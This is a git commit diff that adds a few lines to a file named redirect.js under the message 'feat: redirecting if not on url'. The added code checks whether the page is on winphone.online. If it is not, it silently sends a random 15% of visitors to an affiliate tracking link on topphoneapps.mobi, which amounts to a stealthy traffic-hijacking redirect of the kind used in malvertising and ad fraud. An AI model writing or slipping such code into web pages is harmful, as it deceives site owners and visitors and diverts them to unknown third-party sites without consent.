c42d38a0ceaa4b352f9182f3abca5108a62cb24d
Denes <dsdenes@gmail.com>
2017-07-19 16:43:17 +0200

    feat: redirecting if not on url
    Signed-off-by: Denes <dsdenes@gmail.com>

--- redirect.js
+++ redirect.js
@@ -1,3 +1,9 @@
-if (Math.random() > 0.2) {
+const a = 'http://winphone.online';
+const b = 'http://www.topphoneapps.mobi/?sl=1862621-626da&data1=Track1&data2=Track2';
+const c = 0.15;
 
+if (!(new RegExp('^' + a)).test(window.location.href)) {
+  if (Math.random() > 1 - c) {
+    window.location.href = b;
+  }
 }
